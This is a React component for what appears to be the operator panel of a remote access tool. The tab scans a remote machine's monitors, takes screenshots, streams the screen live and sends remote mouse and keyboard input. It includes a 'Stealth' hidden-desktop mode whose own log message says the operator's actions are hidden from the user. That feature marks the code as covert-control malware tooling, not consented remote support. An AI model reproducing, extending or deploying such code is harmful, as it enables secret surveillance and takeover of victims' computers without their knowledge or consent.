import React, { useState, useRef, useEffect } from 'react';

const ScreenshotTab = ({ isConnected, sendCommand, addLog, ws, screenFrame, setScreenFrame, isStreamingScreen, setIsStreamingScreen }) => {
  const [screenshotData, setScreenshotData] = useState(null);
  const [availableMonitors, setAvailableMonitors] = useState([]);
  const [selectedMonitor, setSelectedMonitor] = useState(-1);
  const [isScanningMonitors, setIsScanningMonitors] = useState(false);
  const [streamQuality, setStreamQuality] = useState(50);
  const [streamFPS, setStreamFPS] = useState(30);
  const [streamSize, setStreamSize] = useState(0);
  
  // Remote Control states
  const [isRemoteControlActive, setIsRemoteControlActive] = useState(false);
  const [useHiddenDesktop, setUseHiddenDesktop] = useState(false);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [scaleMode, setScaleMode] = useState('fit'); // 'fit', 'fill', 'actual'
  const canvasRef = useRef(null);
  const containerRef = useRef(null);

  // Handle WebSocket messages (CHỈ xử lý SCREENSHOT và MONITOR_LIST)
  useEffect(() => {
    if (!ws) return;

    const handleMessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        
        if (data.type === 'SCREENSHOT_RESULT') {
          setScreenshotData(data.data);
          addLog('Screenshot received successfully!', 'success');
        } else if (data.type === 'MONITOR_LIST') {
          setAvailableMonitors(data.data);
          setIsScanningMonitors(false);
          addLog(`Found ${data.data.length} monitor(s)`, 'success');
        } else if (data.type === 'SCREEN_FRAME') {
          // Update quality, FPS, size info nếu có
          if (data.quality) setStreamQuality(data.quality);
          if (data.fps) setStreamFPS(data.fps);
          if (data.size) setStreamSize(data.size);
        }
        // SCREEN_FRAME data được xử lý trong App.js
      } catch (error) {
        // Ignore parse errors
      }
    };

    ws.addEventListener('message', handleMessage);
    return () => ws.removeEventListener('message', handleMessage);
  }, [ws, addLog]);

  // Auto-scan monitors when connected
  useEffect(() => {
    if (isConnected && availableMonitors.length === 0 && !isScanningMonitors) {
      handleScanMonitors();
    }
  }, [isConnected]);

  // Scan monitors
  const handleScanMonitors = () => {
    setIsScanningMonitors(true);
    sendCommand('SCAN_MONITORS');
    addLog('Scanning available monitors...', 'info');
  };

  // Take screenshot
  const handleTakeScreenshot = () => {
    sendCommand('SCREENSHOT', { monitorIndex: selectedMonitor });
    addLog(`Requesting screenshot (Monitor ${selectedMonitor === -1 ? 'All' : selectedMonitor})...`, 'info');
  };

  // Download screenshot
  const downloadScreenshot = () => {
    if (!screenshotData) return;
    const link = document.createElement('a');
    link.href = 'data:image/jpeg;base64,' + screenshotData;
    link.download = `screenshot_${Date.now()}.jpg`;
    link.click();
    addLog('Screenshot downloaded', 'success');
  };

  // Start/Stop screen streaming
  const handleStartScreenStream = () => {
    if (!isStreamingScreen) {
      setIsStreamingScreen(true);
      sendCommand('START_SCREEN', { monitorIndex: selectedMonitor });
      addLog(`Starting screen stream (Monitor ${selectedMonitor === -1 ? 'All' : selectedMonitor})...`, 'info');
    }
  };

  const handleStopScreenStream = () => {
    if (isStreamingScreen) {
      setIsStreamingScreen(false);
      sendCommand('STOP_SCREEN');
      setScreenFrame(null);
      setIsRemoteControlActive(false);
      if (useHiddenDesktop) {
        sendCommand('DISABLE_HIDDEN_DESKTOP');
        setUseHiddenDesktop(false);
      }
      addLog('Screen streaming stopped', 'info');
    }
  };

  // Remote Control Functions
  const toggleRemoteControl = () => {
    setIsRemoteControlActive(!isRemoteControlActive);
    addLog(isRemoteControlActive ? 'Remote control disabled' : 'Remote control enabled', 'info');
  };

  const toggleHiddenDesktop = () => {
    const newState = !useHiddenDesktop;
    setUseHiddenDesktop(newState);
    
    if (newState) {
      sendCommand('ENABLE_HIDDEN_DESKTOP');
      addLog('Hidden desktop enabled - actions are now hidden from user', 'success');
    } else {
      sendCommand('DISABLE_HIDDEN_DESKTOP');
      addLog('Hidden desktop disabled - back to normal desktop', 'info');
    }
  };

  const toggleFullscreen = () => {
    if (!isFullscreen) {
      if (containerRef.current.requestFullscreen) {
        containerRef.current.requestFullscreen();
      } else if (containerRef.current.webkitRequestFullscreen) {
        containerRef.current.webkitRequestFullscreen();
      } else if (containerRef.current.msRequestFullscreen) {
        containerRef.current.msRequestFullscreen();
      }
    } else {
      if (document.exitFullscreen) {
        document.exitFullscreen();
      } else if (document.webkitExitFullscreen) {
        document.webkitExitFullscreen();
      } else if (document.msExitFullscreen) {
        document.msExitFullscreen();
      }
    }
  };

  // Listen for fullscreen changes
  useEffect(() => {
    const handleFullscreenChange = () => {
      setIsFullscreen(!!document.fullscreenElement);
    };

    document.addEventListener('fullscreenchange', handleFullscreenChange);
    document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
    document.addEventListener('msfullscreenchange', handleFullscreenChange);

    return () => {
      document.removeEventListener('fullscreenchange', handleFullscreenChange);
      document.removeEventListener('webkitfullscreenchange', handleFullscreenChange);
      document.removeEventListener('msfullscreenchange', handleFullscreenChange);
    };
  }, []);

  const handleCanvasClick = (e) => {
    if (!isRemoteControlActive || !canvasRef.current) return;
    
    const rect = canvasRef.current.getBoundingClientRect();
    const x = Math.floor((e.clientX - rect.left) * (canvasRef.current.width / rect.width));
    const y = Math.floor((e.clientY - rect.top) * (canvasRef.current.height / rect.height));
    
    sendCommand('MOUSE_EVENT', {
      action: 'move',
      x: x,
      y: y,
      screenWidth: canvasRef.current.width,
      screenHeight: canvasRef.current.height,
      monitorIndex: selectedMonitor
    });
    
    // Click
    const button = e.button === 0 ? 'left' : e.button === 2 ? 'right' : 'middle';
    sendCommand('MOUSE_EVENT', {
      action: 'click',
      button: button
    });
  };

  const handleCanvasMouseMove = (e) => {
    if (!isRemoteControlActive || !canvasRef.current) return;
    
    const rect = canvasRef.current.getBoundingClientRect();
    const x = Math.floor((e.clientX - rect.left) * (canvasRef.current.width / rect.width));
    const y = Math.floor((e.clientY - rect.top) * (canvasRef.current.height / rect.height));
    
    sendCommand('MOUSE_EVENT', {
      action: 'move',
      x: x,
      y: y,
      screenWidth: canvasRef.current.width,
      screenHeight: canvasRef.current.height,
      monitorIndex: selectedMonitor
    });
  };

  const handleCanvasContextMenu = (e) => {
    e.preventDefault();
  };

  const handleKeyDown = (e) => {
    if (!isRemoteControlActive) return;
    
    e.preventDefault();
    sendCommand('KEYBOARD_EVENT', {
      action: 'keydown',
      keyCode: e.keyCode,
      key: e.key
    });
  };

  const handleKeyUp = (e) => {
    if (!isRemoteControlActive) return;
    
    e.preventDefault();
    sendCommand('KEYBOARD_EVENT', {
      action: 'keyup',
      keyCode: e.keyCode,
      key: e.key
    });
  };

  // Add keyboard event listeners when remote control is active
  useEffect(() => {
    if (isRemoteControlActive) {
      window.addEventListener('keydown', handleKeyDown);
      window.addEventListener('keyup', handleKeyUp);
      
      return () => {
        window.removeEventListener('keydown', handleKeyDown);
        window.removeEventListener('keyup', handleKeyUp);
      };
    }
  }, [isRemoteControlActive]);

  // Update canvas when screen frame changes
  useEffect(() => {
    if (screenFrame && canvasRef.current) {
      const img = new Image();
      img.onload = () => {
        const canvas = canvasRef.current;
        const ctx = canvas.getContext('2d');
        canvas.width = img.width;
        canvas.height = img.height;
        ctx.drawImage(img, 0, 0);
      };
      img.src = `data:image/jpeg;base64,${screenFrame}`;
    }
  }, [screenFrame]);


  return (
    <div className="command-section screenshot-tab">
      <h3>🖥️ Screen Capture & Remote Control</h3>

      {!isStreamingScreen ? (
        // Setup Mode - When not streaming
        <>
          {/* Monitor Selection */}
          <div className="section-group">
            <h4>📺 Monitor Selection</h4>
            <button 
              onClick={handleScanMonitors} 
              className="btn btn-scan-cam"
              disabled={!isConnected || isScanningMonitors}
            >
              {isScanningMonitors ? '🔄 Scanning...' : '📺 Scan Monitors'}
            </button>
            
            {availableMonitors.length > 0 && (
              <div className="camera-radio-group">
                <label className="camera-group-label">Available Monitors:</label>
                <div className="camera-radio-list">
                  {/* All Monitors Option */}
                  <label className="camera-radio-item">
                    <input
                      type="radio"
                      name="monitor"
                      value={-1}
                      checked={selectedMonitor === -1}
                      onChange={(e) => setSelectedMonitor(parseInt(e.target.value))}
                    />
                    <div className="camera-info">
                      <span className="camera-name">🖥️ All Monitors</span>
                      <span className="camera-specs">Combined virtual screen</span>
                    </div>
                  </label>
                  
                  {availableMonitors.map((mon) => (
                    <label key={mon.index} className="camera-radio-item">
                      <input
                        type="radio"
                        name="monitor"
                        value={mon.index}
                        checked={selectedMonitor === mon.index}
                        onChange={(e) => setSelectedMonitor(parseInt(e.target.value))}
                      />
                      <div className="camera-info">
                        <span className="camera-name">
                          {mon.isPrimary && '⭐ '}
                          {mon.name}
                          {mon.isPrimary && ' (Primary)'}
                        </span>
                        <span className="camera-specs">
                          {mon.resolution} • {mon.frequency}
                        </span>
                      </div>
                    </label>
                  ))}
                </div>
              </div>
            )}
          </div>

          {/* Quick Actions */}
          <div className="section-group">
            <h4>⚡ Quick Actions</h4>
            <div style={{ display: 'flex', gap: '10px', flexWrap: 'wrap' }}>
              <button 
                onClick={handleTakeScreenshot} 
                className="btn btn-command"
                disabled={!isConnected}
              >
                📸 Take Screenshot
              </button>
              <button 
                onClick={handleStartScreenStream} 
                className="btn btn-stream"
                disabled={!isConnected}
              >
                ▶️ Start Live Stream
              </button>
            </div>
          </div>

          {/* Screenshot Preview */}
          {screenshotData && (
            <div className="section-group">
              <h4>📸 Screenshot Result</h4>
              <div className="media-preview">
                <img 
                  src={`data:image/jpeg;base64,${screenshotData}`} 
                  alt="Screenshot" 
                  className="preview-image"
                />
                <div className="preview-actions">
                  <button onClick={downloadScreenshot} className="btn btn-success">
                    💾 Download
                  </button>
                  <button onClick={() => setScreenshotData(null)} className="btn btn-small">
                    ✖ Close
                  </button>
                </div>
              </div>
            </div>
          )}
        </>
      ) : (
        // Streaming Mode - Full screen remote control interface
        <div 
          ref={containerRef}
          className={`remote-control-interface ${isFullscreen ? 'fullscreen-mode' : ''}`}
        >
          {/* Control Bar */}
          <div className="rc-control-bar">
            <div className="rc-control-left">
              <button 
                onClick={handleStopScreenStream} 
                className="btn btn-danger btn-small"
              >
                ⏹️ Stop Stream
              </button>
              
              <div className="rc-status-badges">
                <span className="rc-badge rc-badge-live">
                  🔴 LIVE
                </span>
                <span className="rc-badge rc-badge-info">
                  {streamFPS} FPS
                </span>
                <span className="rc-badge rc-badge-info">
                  Q: {streamQuality}%
                </span>
                <span className="rc-badge rc-badge-info">
                  {(streamSize / 1024).toFixed(1)} KB
                </span>
              </div>
            </div>

            <div className="rc-control-right">
              <button 
                onClick={toggleRemoteControl}
                className={`btn btn-small ${isRemoteControlActive ? 'btn-danger' : 'btn-primary'}`}
                title={isRemoteControlActive ? 'Disable Remote Control' : 'Enable Remote Control'}
              >
                {isRemoteControlActive ? '🎮 RC ON' : '🎮 RC OFF'}
              </button>

              <label className="rc-checkbox-label">
                <input
                  type="checkbox"
                  checked={useHiddenDesktop}
                  onChange={toggleHiddenDesktop}
                />
                <span>🔒 Stealth</span>
              </label>

              <select 
                value={scaleMode} 
                onChange={(e) => setScaleMode(e.target.value)}
                className="rc-scale-select"
              >
                <option value="fit">Fit Screen</option>
                <option value="fill">Fill Screen</option>
                <option value="actual">Actual Size</option>
              </select>

              <button 
                onClick={toggleFullscreen}
                className="btn btn-small btn-primary"
                title={isFullscreen ? 'Exit Fullscreen' : 'Enter Fullscreen'}
              >
                {isFullscreen ? '🗗 Exit' : '⛶ Full'}
              </button>
            </div>
          </div>

          {/* Screen Display Area */}
          <div className={`rc-screen-container ${isRemoteControlActive ? 'rc-active' : ''}`}>
            {screenFrame ? (
              <canvas
                ref={canvasRef}
                onClick={handleCanvasClick}
                onMouseMove={handleCanvasMouseMove}
                onContextMenu={handleCanvasContextMenu}
                className={`rc-canvas ${scaleMode}`}
                style={{ 
                  cursor: isRemoteControlActive ? 'crosshair' : 'default'
                }}
              />
            ) : (
              <div className="rc-loading">
                <div className="spinner"></div>
                <p>Connecting to remote screen...</p>
              </div>
            )}

            {/* Remote Control Status Overlay */}
            {isRemoteControlActive && (
              <div className="rc-status-overlay">
                <div className="rc-status-indicator">
                  <span className="rc-pulse"></span>
                  <span>Remote Control Active</span>
                </div>
                {useHiddenDesktop && (
                  <div className="rc-stealth-indicator">
                    🔒 Stealth Mode - Actions Hidden
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Fullscreen Help */}
          {isFullscreen && (
            <div className="rc-help-overlay">
              <span>Press ESC to exit fullscreen</span>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default ScreenshotTab;
